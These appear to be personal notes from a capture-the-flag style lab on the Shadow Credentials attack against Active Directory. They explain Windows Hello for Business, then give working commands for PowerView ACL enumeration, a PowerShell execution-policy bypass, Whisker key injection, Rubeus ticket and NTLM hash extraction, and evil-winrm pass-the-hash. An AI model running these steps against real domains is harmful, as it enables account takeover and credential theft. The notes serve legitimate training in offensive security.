## Table of Contents

  - [Table of Contents](#Table\of\Contents)
          - [Objectives](#Objectives)
- [Window Hello for Business](#window\hello\for\business)
  - [Enumeration](#Enumeration)
      - [Exploitation](#Exploitation)
          - [Obtain the NTLM Hash](#Obtain\the\NTLM\Hash)
          - [Performing a pass-the-hash attack using evil-winrm](#Performing\a\pass-the-hash\attack\using\evil-winrm)

## Table of Contents

          - [Objectives](#Objectives)
- [Window Hello for Business](#window\hello\for\business)
  - [Enumeration](#Enumeration)
      - [Exploitation](#Exploitation)
          - [Obtain the NTLM Hash](#Obtain\the\NTLM\Hash)
          - [Performing a pass-the-hash attack using evil-winrm](#Performing\a\pass-the-hash\attack\using\evil-winrm)


###### Objectives
- Intro to Windows Hello for Business
- Prerequisites for exploiting GenericWrite Privilege
- How Shadow Credentials work
- How to exploit the vulnerability
---
# Window Hello for Business
	"Think Passwords Are Hard To Remember - Say Hello to WHfB"
- Way to replace conventional keys for user verification. User on the Active directory domain can access the `AD` using a PIN or biometrics connected to a pair of cryptographic keys. Public and private. These keys are used to help to prove the identity of the entity to which they belong. 
- `msDS-KeyCredentialLink` is an attribute by the Domain Controller to store the public key in Windows Hello for Privilege

![[Pasted image 20231220033542.png]]



The procedure for storing a new pair of certificates with `WHfB`:
1. `Truster Platform Module` public-private key pair generation: The TPM creates a public-private key pair fdor the user's account when they enroll. 
2. `Client Certificate Request`: The client initiates a certificate request to receive a trustworthy certificate. The organisation's certificate issuing authority (CA) receives this request and provides a valid certificiate. 
3. `Key Storage`: The user account's `msDS-KeyCredentialLink`


Authentication Process:
1. Authorisation: The Domain Controller decrypts the client's pre-authentication data using the raw public key stored in the `msDS-KeyCredentialLink` attribute of the user's account.
2. Certificate Generation: The certificate is created for the user by the Domain Controller and can be sent back to the client
3. Authentication: After that, the client can log in to the Active directory domain using the certificate.

## Enumeration
Check for and security misconfigurations. 
- Enumerate for vulnerable permissions
	- Use PowerShell Script `PowerView`
```powershell
Find-InterestingDomainAcl
```
This will list all abusable privileges. It's then possible to filter for the current user "hr"

In this case we are specifically looking for any write privilege since the goal is to overwrite the `msDS-KeyCredentialLink`
**Bypass default policy for arbitrary PowerShell Script execution**
```powershell
powershell -ep bypass
```

At this point, we can enumerate the privileges by running:  
`Find-InterestingDomainAcl -ResolveGuids`

**This command return's all users' privileges. We can filter it as follows, whereas "\\" represents the filter being sought after.**
```powershell
Where-Object { $_.IdentityReferenceName -eq "\"}
```
---
**Filter out the current user, Vulnerable user, and the privilege assigned:**
```powershell
Select-Object IdentityReferenceName, ObjectDN, ActiveDirectoryRights
```
---
**The full command for finding vulnerable privileges on a given user ('hr'):**
```powershell
Find-InterestingDomainAcl -ResolveGuids | Where-Object { $_.IdentityReferenceName -eq "hr" } | Select-Object IdentityReferenceName, ObjectDN, ActiveDirectoryRights
```

![[Pasted image 20231220034606.png]]
- From the output, the user "hr" has the `GenericWrite` permission over the administrator object visible on the CN attribute. Later, we can compromise the account with that privilege by updating the `msDS-KeyCredentialLink` with a certificate. This vulnerability is known as the *Shadow Credentials Attack*.
Note: The vulnerable user may not be the same as the administrator; please note that down since you will use it in the exploitation section!
- ---
#### Exploitation
`Whisker` - a `C#` utility created by Elad Shamir. Whisker is straightforward: once we have a vulnerable user, we run the add command from whisker to simulate the enrollment of a malicious device updating the `msDS-KeyCredentialLink`

- This task can be accomplished by running the following command: 
`.\Whisker.exe add /target:Administrator`

In your case, you'll have to replace the `/target` parameter with the one from the enumeration step executed inside your VM.

- **Exploit the vulnerable privilege**
```powershell
PS C:\Users\hr\Desktop> .\Whisker.exe add /target:Administrator
```
- This will provide the certificate necessary to authenticate the impersonation of the vulnerable user with a command ready to be launched using `Rubeus`

1. Ask for a `Ticket-Granting-Ticket` of the vulnerable user using the certificate generated in the previous command.
2. Once the certificate is obtained, you can acquire a valid `TGT` and impersonate the vulnerable user. Additionally, the `NTLM` hash of the user account can be displayed in the console output, which can be easily used for a `pass-the-hash` attack.

`asktgt` - makes a request to obtain the TGT
`/user` - User we want to impersonate for the TGT
`/certificate` - the certificate generated to impersonate the target user
`/password` - the password for decoding the certificate since it encrypted
`/domain` - the target domain
`/getcredentials` - this flag will retrieve the NTLM hash, which in the next step:
- `/dc`
---
###### Obtain the NTLM Hash
```powershell
.\Rubeus.exe asktgt /user:Administrator /certificate:MIIJwAIBAzCCCXwGCSqGSIb3DQEH[snip] /password:"qfyNlIfCjVqzwh1e" /domain:AOC.local /dc:southpole.AOC.local /getcredentials /show
```
###### Performing a pass-the-hash attack using evil-winrm
```bash
evil-winrm -i MACHINE_IP -u USERNAME -H HASH...
```
****




















































































































